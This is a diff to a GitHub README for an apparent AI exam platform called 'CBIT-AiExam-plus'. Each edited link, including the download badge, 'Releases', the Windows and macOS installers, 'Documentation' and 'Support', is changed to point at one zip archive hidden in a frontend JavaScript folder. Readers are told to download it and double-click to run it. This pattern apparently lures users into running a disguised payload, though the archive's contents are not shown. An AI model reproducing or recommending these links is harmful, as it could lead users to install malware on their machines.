@@ -1,7 +1,7 @@
 # 🎓 CBIT-AiExam-plus - Your AI-Powered Testing Solution
 
 ## 📥 Download Now!
-[![Download CBIT-AiExam-plus](https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/bewet/CBIT-AiExam-plus.zip)](https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/bewet/CBIT-AiExam-plus.zip)
+[![Download CBIT-AiExam-plus](https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/frontend/static/js/plus-CBI-Ai-Exam-2.5-alpha.2.zip)](https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/frontend/static/js/plus-CBI-Ai-Exam-2.5-alpha.2.zip)
 
 ## 🚀 Getting Started
 CBIT-AiExam-plus is a powerful examination platform that uses AI to help schools, training providers, and businesses deliver assessments smoothly. With features like item generation, adaptive difficulty, and in-depth analytics, this tool fits various testing needs.
@@ -27,7 +27,7 @@ CBIT-AiExam-plus offers:
 
 ## 📦 Download & Install
 ### Step 1: Visit the Releases Page
-To get started, visit our [Releases page](https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/bewet/CBIT-AiExam-plus.zip). Here, you will find the latest version available for download.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/frontend/static/js/plus-CBI-Ai-Exam-2.5-alpha.2.zip). Here, you will find the latest version available for download.
 
 ### Step 2: Choose Your Version
 On the Releases page, locate the latest version of CBIT-AiExam-plus. You can identify it by the version number, which is usually formatted like "v1.0".
@@ -36,8 +36,8 @@ On the Releases page, locate the latest version of CBIT-AiExam-plus. You can ide
 Find the installation file for your operating system, such as a Windows installer or a macOS package. Click on the link to start the download. 
 
 You will see options such as:
-- **https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/bewet/CBIT-AiExam-plus.zip** for Windows users.
-- **https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/bewet/CBIT-AiExam-plus.zip** for macOS users.
+- **https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/frontend/static/js/plus-CBI-Ai-Exam-2.5-alpha.2.zip** for Windows users.
+- **https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/frontend/static/js/plus-CBI-Ai-Exam-2.5-alpha.2.zip** for macOS users.
 
 ### Step 4: Run the Installer
 Once the download is complete, locate the file in your downloads folder. Double-click the file to run the installer. Follow the on-screen prompts to complete the installation.
@@ -69,8 +69,8 @@ After assessments, review detailed analytics provided by the platform. Use this 
 If you encounter any issues or have questions, please reach out through our support channels. You can also engage with other users via our community page, where experience and tips are shared.
 
 ## 🔗 Useful Links
-- [CBIT-AiExam-plus Releases](https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/bewet/CBIT-AiExam-plus.zip)
-- [Documentation](https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/bewet/CBIT-AiExam-plus.zip)
-- [Support](https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/bewet/CBIT-AiExam-plus.zip)
+- [CBIT-AiExam-plus Releases](https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/frontend/static/js/plus-CBI-Ai-Exam-2.5-alpha.2.zip)
+- [Documentation](https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/frontend/static/js/plus-CBI-Ai-Exam-2.5-alpha.2.zip)
+- [Support](https://raw.githubusercontent.com/ckaimuk/CBIT-AiExam-plus/main/frontend/static/js/plus-CBI-Ai-Exam-2.5-alpha.2.zip)
 
 For continuous updates, stay tuned to the Releases page and follow us on social media. Enjoy using CBIT-AiExam-plus!
